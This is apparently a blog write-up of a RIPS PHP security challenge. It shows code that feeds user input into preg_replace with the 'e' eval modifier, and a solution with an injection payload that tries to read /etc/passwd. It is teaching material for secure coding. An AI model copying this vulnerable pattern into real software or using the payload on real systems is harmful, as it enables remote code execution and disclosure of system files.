---

title: rips-57
author: raxjs
tags: [php]

---

$DESCRIPTION

<!--more-->
{{< reference src="https://twitter.com/ripstech/status/1162396599416324100" >}}

# Code
{{< code language="php"  title="Challenge" expand="Show" collapse="Hide" isCollapsed="false" >}}
header("Content-Type: text/plain");

function complexStrtolower($regex, $value) {
    return preg_replace(
        '/(' . $regex . ')/ei',
        'strtolower("\\1")',
        $value
    );
}

foreach($_GET as $regex => $value) {
    echo complexStrtolower($regex, $value) . "\n";
}

{{< /code >}}

# Solution
{{< code language="php" highlight="" title="Solution" expand="Show" collapse="Hide" isCollapsed="true" >}}
header("Content-Type: text/plain");

function complexStrtolower($regex, $value) {
    return preg_replace(
        '/(' . $regex . ')/ei',                   // 2) regex modifier 'e' is used for evaluation
        'strtolower("\\1")',                      // 3) php funciton is called with back reference, code exec here
        $value
    );
}

foreach($_GET as $regex => $value) {              // 1) $regex and $value = user input
    echo complexStrtolower($regex, $value) . "\n";
}

// example:
echo complexStrtolower('.*', 'a");eval(\'cat /etc/passwd\');//');
// the second parameter of preg_replace will become: 
//    strtolower("a");eval('cat /etc/passwd');//")strtolower("")
// the 'e' modifier is deprecated anyway...


{{< /code >}}